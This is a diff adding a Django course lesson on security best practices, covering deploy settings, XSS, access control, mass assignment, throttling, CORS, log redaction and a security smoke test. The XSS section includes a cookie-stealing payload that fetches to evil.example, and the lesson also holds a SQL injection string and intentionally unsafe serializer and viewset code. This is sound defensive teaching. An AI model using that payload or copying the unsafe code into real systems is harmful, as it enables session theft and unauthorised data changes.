@@ -1,0 +1,517 @@
+---
+title: Security & best practices
+summary: A practical security checklist for Django backends, each item demonstrated. Secrets and settings, HTTPS and secure cookies, CSRF, XSS, SQL injection, clickjacking, broken access control and mass assignment, passwords and brute force, CORS, file uploads, logging without leaking personal data, and keeping dependencies patched.
+estimatedMinutes: 25
+difficulty: medium
+section: Quality, Security & Production
+objectives:
+  - Configure the production security settings and verify them with check --deploy
+  - Explain and prevent CSRF, XSS, SQL injection and clickjacking in Django
+  - Prevent broken access control and mass assignment in views and serializers
+  - Protect logins (hashing, validators, throttling) and handle secrets and personal data safely
+  - Keep dependencies updated and know where to look for vulnerabilities
+prerequisites:
+  - API authentication & permissions
+  - Middleware & signals
+tags: [security, django, owasp, csrf, xss, best-practices]
+---
+
+## Intuition: locks on every door, not one big gate
+
+Security isn't one feature you switch on. It's many small, boring decisions, each closing one door:
+a secret that never reaches Git, a cookie that only travels over HTTPS, a queryset filtered by the
+owner, a serializer that ignores fields it shouldn't accept. Django closes many doors by default (CSRF,
+escaping, parameterised SQL, password hashing). Your job is to not reopen them, and to close the ones
+only you can see: your own permission rules.
+
+## The precise rules
+
+The checklist, mapped to the OWASP Top 10 risks:
+
+| Risk                           | Django's defence                         | Your part                                                         |
+| ------------------------------ | ---------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------------- |
+| Broken access control          | permissions, `login_required`            | scope every queryset to the user; check objects                   |
+| Injection (SQL)                | the ORM uses parameters                  | never format SQL strings; `%s` params in raw SQL                  |
+| XSS                            | template autoescaping                    | no `                                                              | safe`/`mark_safe` on user data; sanitise rich text |
+| CSRF                           | `CsrfViewMiddleware`, `{% csrf_token %}` | don't `csrf_exempt` cookie-authenticated views                    |
+| Clickjacking                   | `XFrameOptionsMiddleware`                | keep it on (`DENY`)                                               |
+| Security misconfiguration      | `check --deploy`                         | `DEBUG=False`, real `SECRET_KEY`, `ALLOWED_HOSTS`, HTTPS settings |
+| Cryptographic failures         | PBKDF2/Argon2 hashing, HSTS              | HTTPS everywhere; secure, HttpOnly cookies                        |
+| Identification & auth failures | validators, session rotation             | throttle logins, MFA for staff, short tokens                      |
+| Vulnerable components          | release notes, security emails           | pin, update, run `pip-audit`                                      |
+| Logging & monitoring failures  | `logging` config                         | log security events, never passwords or tokens                    |
+
+**Production settings** (all read from the environment; the Auth starter and ShopLite projects use
+them and test them):
+
+```python norun title="settings for production"
+DEBUG = False
+SECRET_KEY = env("DJANGO_SECRET_KEY")  # long, random, unique per environment
+ALLOWED_HOSTS = env.list("DJANGO_ALLOWED_HOSTS")
+SECURE_PROXY_SSL_HEADER = ("HTTP_X_FORWARDED_PROTO", "https")  # behind a TLS-terminating proxy
+SECURE_SSL_REDIRECT = True
+SECURE_HSTS_SECONDS = 31536000
+SECURE_HSTS_INCLUDE_SUBDOMAINS = True
+SECURE_HSTS_PRELOAD = True
+SESSION_COOKIE_SECURE = True
+CSRF_COOKIE_SECURE = True
+CSRF_TRUSTED_ORIGINS = ["https://shop.example.com"]
+```
+
+**Mass assignment:** serializers and forms must list their fields; server-controlled fields
+(`owner`, `is_staff`, `price`, `status`) are read-only and set in code.
+
+**Files:** limit upload size and type, store outside the code, serve user uploads from another domain
+or with `Content-Disposition: attachment`, and never build file paths from user input.
+
+**Personal data in logs:** log ids, not emails, passwords, tokens or card numbers. Errors sent to a
+monitoring tool must be scrubbed too.
+
+**Dependencies:** pin them, read Django's security releases (they're announced in advance), run
+`pip-audit` in CI, and upgrade at least to each new LTS patch release.
+
+## Worked example
+
+`check --deploy` on two configurations: what a fresh project looks like, and what a hardened one
+looks like.
+
+```python title="deploy_check.py"
+from playground import setup
+
+HARDENED = {
+    "SECRET_KEY": "fake-prod-key-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL",
+    "SECURE_SSL_REDIRECT": True, "SECURE_HSTS_SECONDS": 31536000, "SECURE_HSTS_INCLUDE_SUBDOMAINS": True,
+    "SECURE_HSTS_PRELOAD": True, "SESSION_COOKIE_SECURE": True, "CSRF_COOKIE_SECURE": True,
+}
+setup(DEBUG=False, SECRET_KEY="django-insecure-short", middleware=[
+    "django.middleware.security.SecurityMiddleware",
+    "django.contrib.sessions.middleware.SessionMiddleware",
+    "django.middleware.csrf.CsrfViewMiddleware",
+    "django.middleware.clickjacking.XFrameOptionsMiddleware",
+])
+
+from django.core import checks
+from django.test import override_settings
+
+urlpatterns = []
+before = sorted(i.id for i in checks.run_checks(include_deployment_checks=True))
+print("fresh project:", before)
+with override_settings(**HARDENED):
+    after = sorted(i.id for i in checks.run_checks(include_deployment_checks=True))
+print("hardened:", after or "no issues")
+```
+
+```text title="Output"
+fresh project: ['security.W004', 'security.W008', 'security.W009', 'security.W012', 'security.W016']
+hardened: no issues
+```
+
+- `W004` HSTS, `W008` HTTPS redirect, `W009` weak secret key, `W012` and `W016` insecure cookies: each
+  warning maps to one setting in the table above.
+- With every setting on, the check is clean. Run it in CI against the production settings module, as
+  ShopLite's `test_production_settings_pass_the_deploy_check` does.
+
+## Variations
+
+### XSS: escaped by default, unsafe on purpose
+
+```python
+from playground import setup
+
+setup()
+
+from django.template import Context, Template
+from django.utils.html import escape, format_html
+
+attack = '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">'
+print("autoescaped:", Template("{{ bio }}").render(Context({"bio": attack}))[:44], "...")
+print("with |safe: ", Template("{{ bio|safe }}").render(Context({"bio": attack}))[:44], "...")
+print("format_html:", format_html("<b>{}</b>", attack)[:44], "...")
+print("in an attribute:", Template('<a title="{{ t }}">').render(Context({"t": '" onmouseover="alert(1)'})))
+```
+
+```text title="Output"
+autoescaped: &lt;img src=x onerror=&quot;fetch(&#x27;http ...
+with |safe:  <img src=x onerror="fetch('https://evil.exam ...
+format_html: <b>&lt;img src=x onerror=&quot;fetch(&#x27;h ...
+in an attribute: <a title="&quot; onmouseover=&quot;alert(1)">
+```
+
+Autoescaping turns markup into harmless text, including quotes inside attributes. The `|safe` version
+would run the attacker's script in every visitor's browser and send their cookies away (an HttpOnly
+session cookie at least stays out of reach). If users may write rich text, sanitise it with an
+allowlist library (such as `nh3`) before storing or rendering.
+
+### Broken access control and mass assignment
+
+```python
+from playground import migrate, setup
+
+setup(apps=["rest_framework"], REST_FRAMEWORK={
+    "DEFAULT_RENDERER_CLASSES": ["rest_framework.renderers.JSONRenderer"],
+    "DEFAULT_AUTHENTICATION_CLASSES": ["rest_framework.authentication.SessionAuthentication"],
+    "DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.IsAuthenticated"],
+})
+
+from django.contrib.auth.models import User
+from django.db import models
+from django.test import Client
+from rest_framework import routers, serializers, viewsets
+
+
+class Invoice(models.Model):
+    owner = models.ForeignKey(User, on_delete=models.CASCADE)
+    amount = models.DecimalField(max_digits=8, decimal_places=2)
+    paid = models.BooleanField(default=False)
+
+
+class UnsafeSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = Invoice
+        fields = "__all__"  # every field writable, including owner and paid
+
+
+class SafeSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = Invoice
+        fields = ["id", "amount", "paid"]
+        read_only_fields = ["amount", "paid"]  # set by the billing code, never by the client
+
+
+class UnsafeViewSet(viewsets.ModelViewSet):
+    queryset = Invoice.objects.all()
+    serializer_class = UnsafeSerializer
+
+
+class SafeViewSet(viewsets.ModelViewSet):
+    serializer_class = SafeSerializer
+
+    def get_queryset(self):
+        return Invoice.objects.filter(owner=self.request.user)
+
+
+router = routers.DefaultRouter()
+router.register("unsafe", UnsafeViewSet, basename="unsafe")
+router.register("safe", SafeViewSet, basename="safe")
+urlpatterns = router.urls
+migrate()
+ada, mallory = User.objects.create_user("ada"), User.objects.create_user("mallory")
+invoice = Invoice.objects.create(owner=ada, amount="120.00")
+c = Client()
+c.force_login(mallory)
+json = "application/json"
+print("unsafe read:", c.get(f"/unsafe/{invoice.pk}/").status_code)
+print("unsafe edit:", c.patch(f"/unsafe/{invoice.pk}/", {"paid": True, "owner": mallory.pk}, content_type=json).json())
+invoice.paid, invoice.owner = False, ada
+invoice.save()
+print("safe read:", c.get(f"/safe/{invoice.pk}/").status_code)
+c.force_login(ada)
+print("owner marks paid:", c.patch(f"/safe/{invoice.pk}/", {"paid": True}, content_type=json).json())
+```
+
+```text title="Output"
+unsafe read: 200
+unsafe edit: {'id': 1, 'amount': '120.00', 'paid': True, 'owner': 2}
+safe read: 404
+owner marks paid: {'id': 1, 'amount': '120.00', 'paid': False}
+```
+
+The unsafe endpoint let Mallory read Ada's invoice, mark it paid and take ownership of it: broken
+access control plus mass assignment, the most common real-world API vulnerabilities. The safe endpoint
+returns 404 to Mallory, and even Ada can't mark her own invoice paid, because `paid` is read-only.
+
+### Brute force: hashing, validators and throttling together
+
+```python
+from playground import migrate, setup
+
+setup(apps=["rest_framework"], REST_FRAMEWORK={
+    "DEFAULT_RENDERER_CLASSES": ["rest_framework.renderers.JSONRenderer"],
+    "DEFAULT_AUTHENTICATION_CLASSES": [], "UNAUTHENTICATED_USER": None,
+    "DEFAULT_THROTTLE_RATES": {"login": "5/minute"},
+}, PASSWORD_HASHERS=["django.contrib.auth.hashers.PBKDF2PasswordHasher"])
+
+from django.contrib.auth import authenticate
+from django.contrib.auth.hashers import identify_hasher
+from django.contrib.auth.models import User
+from django.test import Client
+from django.urls import path
+from rest_framework.response import Response
+from rest_framework.throttling import ScopedRateThrottle
+from rest_framework.views import APIView
+
+
+class Login(APIView):
+    throttle_classes = [ScopedRateThrottle]
+    throttle_scope = "login"
+
+    def post(self, request):
+        user = authenticate(username=request.data.get("username"), password=request.data.get("password"))
+        if user is None:
+            return Response({"detail": "Invalid username or password."}, status=401)  # same message for both
+        return Response({"detail": "welcome"})
+
+
+urlpatterns = [path("login/", Login.as_view())]
+migrate()
+ada = User.objects.create_user("ada", password="correct horse battery staple")
+print("stored with:", identify_hasher(ada.password).algorithm, "| iterations:", ada.password.split("$")[1])
+guesses = ["123456", "password", "qwerty", "letmein", "dragon", "correct horse battery staple"]
+c = Client()
+for guess in guesses:
+    r = c.post("/login/", {"username": "ada", "password": guess}, content_type="application/json")
+    print(f"{guess!r:<32} {r.status_code}")
+```
+
+```text title="Output"
+stored with: pbkdf2_sha256 | iterations: 1000000
+'123456'                         401
+'password'                       401
+'qwerty'                         401
+'letmein'                        401
+'dragon'                         401
+'correct horse battery staple'   429
+```
+
+Six guesses, and the sixth (the right password) is refused with 429 because the throttle already ran
+out: an attacker gets 5 tries a minute, while a slow hash with hundreds of thousands of iterations makes
+offline cracking of a stolen database just as painful. Real deployments add account lockout or MFA,
+especially for staff.
+
+### CORS: exactly the origins you trust
+
+```python
+from playground import setup
+
+setup(apps=["corsheaders"], middleware=[
+    "corsheaders.middleware.CorsMiddleware",
+    "django.middleware.common.CommonMiddleware",
+], CORS_ALLOWED_ORIGINS=["https://app.example.com"], CORS_URLS_REGEX=r"^/api/.*$")
+
+from django.http import JsonResponse
+from django.test import Client
+from django.urls import path
+
+urlpatterns = [path("api/me/", lambda r: JsonResponse({"id": 7})), path("admin-ish/", lambda r: JsonResponse({}))]
+c = Client()
+for origin, url in [("https://app.example.com", "/api/me/"), ("https://evil.example", "/api/me/"),
+                    ("https://app.example.com", "/admin-ish/")]:
+    allowed = c.get(url, headers={"Origin": origin}).get("Access-Control-Allow-Origin", "(none)")
+    print(f"{origin:<26} {url:<11} -> Access-Control-Allow-Origin: {allowed}")
+preflight = c.options("/api/me/", headers={"Origin": "https://app.example.com",
+                                           "Access-Control-Request-Method": "POST"})
+print("preflight:", preflight.status_code, preflight["Access-Control-Allow-Methods"][:20], "...")
+```
+
+```text title="Output"
+https://app.example.com    /api/me/    -> Access-Control-Allow-Origin: https://app.example.com
+https://evil.example       /api/me/    -> Access-Control-Allow-Origin: (none)
+https://app.example.com    /admin-ish/ -> Access-Control-Allow-Origin: (none)
+preflight: 200 DELETE, GET, OPTIONS ...
+```
+
+CORS tells browsers which **other websites** may read your API's responses. It isn't authentication:
+curl ignores it. List exact origins (never `*` with cookies), and limit CORS to API paths, as ShopLite
+does with `CORS_URLS_REGEX`.
+
+### Logging without leaking secrets
+
+```python
+import logging
+import re
+import sys
+
+SENSITIVE = re.compile(r"(?i)(password|token|secret|authorization|card)(\"?\s*[:=]\s*\"?)([^\s,\"&]+)")
+BEARER = re.compile(r"(?i)(bearer\s+)\S+")
+
+
+class Redact(logging.Filter):
+    def filter(self, record):
+        record.msg = BEARER.sub(r"\1[REDACTED]", str(record.msg))
+        record.msg = SENSITIVE.sub(lambda m: m.group(1) + m.group(2) + "[REDACTED]", record.msg)
+        return True
+
+
+logger = logging.getLogger("shop.security")
+handler = logging.StreamHandler(sys.stdout)
+handler.setFormatter(logging.Formatter("%(levelname)s %(message)s"))
+handler.addFilter(Redact())
+logger.addHandler(handler)
+logger.propagate = False
+
+logger.warning("failed login user_id=7 ip=203.0.113.5 password=hunter2")
+logger.warning('payload {"email_hash": "a1b2", "token": "eyJhbGciOi.xyz"}')
+logger.warning("Authorization: Bearer abc.def.ghi from user_id=7")
+```
+
+```text title="Output"
+WARNING failed login user_id=7 ip=203.0.113.5 password=[REDACTED]
+WARNING payload {"email_hash": "a1b2", "token": "[REDACTED]"}
+WARNING Authorization: [REDACTED] [REDACTED] from user_id=7
+```
+
+Security events (failed logins, permission denials, webhook signature failures) should be logged, with
+the user id, IP and request id, so you can investigate. The values attackers want (passwords, tokens,
+card numbers, often emails) must never reach the logs, which are copied to many systems and kept for a
+long time. A redacting filter is a safety net; the real rule is not to log them at all.
+
+## Putting it together
+
+The Auth starter switches on every production protection when `DEBUG` is off and proves it in a test;
+ShopLite adds security headers in middleware and runs `check --deploy --fail-level WARNING` against its
+production settings in its test suite:
+
+<ProjectFiles project="auth-starter" paths="config/settings.py accounts/tests/test_web.py" />
+
+A runnable security smoke test: one script that attacks a small app the way a scanner would and checks
+every door is closed.
+
+```python title="security_smoke_test.py"
+import re
+
+from playground import migrate, setup
+
+setup(DEBUG=False, ALLOWED_HOSTS=["shop.example.com"], SECURE_HSTS_SECONDS=31536000,
+      SECURE_SSL_REDIRECT=True, SESSION_COOKIE_SECURE=True, CSRF_COOKIE_SECURE=True,
+      templates={"profile.html": "<p>{{ bio }}</p><form method=post>{% csrf_token %}</form>"},
+      middleware=[
+          "django.middleware.security.SecurityMiddleware",
+          "django.contrib.sessions.middleware.SessionMiddleware",
+          "django.middleware.common.CommonMiddleware",  # reads (and so validates) the Host header
+          "django.middleware.csrf.CsrfViewMiddleware",
+          "django.contrib.auth.middleware.AuthenticationMiddleware",
+          "django.middleware.clickjacking.XFrameOptionsMiddleware",
+      ])
+
+from django.contrib.auth import login
+from django.contrib.auth.decorators import login_required
+from django.contrib.auth.models import User
+from django.db import models
+from django.http import HttpResponse, JsonResponse
+from django.shortcuts import get_object_or_404, render
+from django.test import Client
+from django.urls import path
+from django.views.decorators.csrf import csrf_exempt
+
+
+class Note(models.Model):
+    owner = models.ForeignKey(User, on_delete=models.CASCADE)
+    text = models.CharField(max_length=100)
+
+
+@csrf_exempt  # demo only: logs in as eve without a form
+def demo_login(request):
+    login(request, User.objects.get(username="eve"))
+    return HttpResponse("ok")
+
+
+def profile(request):
+    if request.method == "POST":
+        return HttpResponse("saved")
+    return render(request, "profile.html", {"bio": request.GET.get("bio", "")})
+
+
+@login_required
+def note(request, pk):
+    return JsonResponse({"text": get_object_or_404(Note, pk=pk, owner=request.user).text})
+
+
+def search(request):
+    return JsonResponse({"n": Note.objects.filter(text__icontains=request.GET.get("q", "")).count()})
+
+
+urlpatterns = [path("profile/", profile), path("notes/<int:pk>/", note), path("search/", search),
+               path("login/", demo_login)]
+migrate()
+ada, eve = User.objects.create_user("ada"), User.objects.create_user("eve")
+Note.objects.create(owner=ada, text="ada's secret")
+https = {"secure": True, "HTTP_HOST": "shop.example.com"}
+results = {}
+c = Client(enforce_csrf_checks=True)
+
+results["plain HTTP redirected to HTTPS"] = c.get("/profile/", HTTP_HOST="shop.example.com").status_code == 301
+results["unknown Host refused"] = c.get("/profile/", HTTP_HOST="evil.example", secure=True).status_code == 400
+page = c.get("/profile/", {"bio": "<script>alert(1)</script>"}, **https)
+results["XSS escaped"] = "<script>" not in page.content.decode()
+results["HSTS + nosniff + no framing"] = (page.has_header("Strict-Transport-Security")
+                                         and page["X-Content-Type-Options"] == "nosniff"
+                                         and page["X-Frame-Options"] == "DENY")
+results["CSRF enforced"] = c.post("/profile/", {}, **https).status_code == 403
+results["SQL injection harmless"] = c.get("/search/", {"q": "' OR '1'='1"}, **https).json() == {"n": 0}
+cookie = c.post("/login/", **https).cookies["sessionid"]  # a real login response
+results["other users' objects hidden"] = c.get("/notes/1/", **https).status_code == 404
+results["session cookie Secure + HttpOnly"] = bool(cookie["secure"]) and bool(cookie["httponly"])
+for check, ok in results.items():
+    print(f"{'PASS' if ok else 'FAIL'}  {check}")
+```
+
+```text title="Output"
+PASS  plain HTTP redirected to HTTPS
+PASS  unknown Host refused
+PASS  XSS escaped
+PASS  HSTS + nosniff + no framing
+PASS  CSRF enforced
+PASS  SQL injection harmless
+PASS  other users' objects hidden
+PASS  session cookie Secure + HttpOnly
+```
+
+Every door is checked from the outside, like an attacker or a scanner would: HTTPS redirect, host
+checks, escaping, headers, CSRF, injection, object access and cookie flags. Writing this test found a
+real gap: Django validates the `Host` header only when code reads it, and without
+`CommonMiddleware` (which reads it on every request) a forged host was answered with 200. A test like this in CI
+catches the day someone switches off a middleware or adds `|safe` to a template.
+
+## Common mistakes
+
+<Callout type="warning" title="DEBUG = True in production">
+  The error page shows settings, environment variables, source code and SQL to whoever triggers an
+  error. It's the single most damaging Django misconfiguration, and `check --deploy` catches it.
+</Callout>
+
+- **Secrets in the repository** (or in a Docker image, a log, a front-end bundle). Environment
+  variables or a secret manager only; rotate anything that leaked.
+- **`fields = "__all__"` and unscoped querysets** in APIs.
+- **`csrf_exempt` on cookie-authenticated views** "to make the 403 go away".
+- **Rolling your own crypto** (token formats, password hashing). Use Django, simplejwt and `secrets`.
+- **Never upgrading.** Old Django and DRF versions have published vulnerabilities; stay on a supported
+  release.
+
+## Practice
+
+<Reveal
+  kind="hint"
+  label="Quick check: which command lists the production security settings you're missing?"
+>
+  `python manage.py check --deploy` (with the production settings module and environment).
+</Reveal>
+
+<Reveal
+  kind="hint"
+  label="Quick check: a customer can change /api/orders/41/ to /api/orders/42/ and see someone else's order. What's wrong and how do you fix it?"
+>
+  Broken access control (IDOR). Scope the queryset to the user
+  (`Order.objects.filter(user=request.user)`) so other ids are simply not found, and add a test for
+  it.
+</Reveal>
+
+<Reveal kind="hint" label="Quick check: why is CORS not a security boundary for your API?">
+  It only tells **browsers** whether a page from another origin may read the response. Scripts, curl
+  and servers ignore it; authentication and permissions protect the API.
+</Reveal>
+
+<Reveal kind="hint" label="Quick check: what should a failed-login log line contain?">
+  The time, user id or the attempted username (hashed if sensitive), source IP, request id and
+  outcome. Never the password, and no tokens.
+</Reveal>
+
+<KeyTakeaways>
+
+- Production: `DEBUG=False`, secret key and hosts from the environment, HTTPS redirect, HSTS, secure
+  cookies; verify with `check --deploy` in CI.
+- Django blocks CSRF, XSS, SQL injection and clickjacking by default: don't switch those defences off.
+- The bugs Django can't prevent are yours: scope querysets, check objects, list serializer fields.
+- Slow password hashes, validators, login throttling and MFA for staff.
+- Exact CORS origins; careful uploads; logs without secrets; dependencies kept current.
+
+</KeyTakeaways>
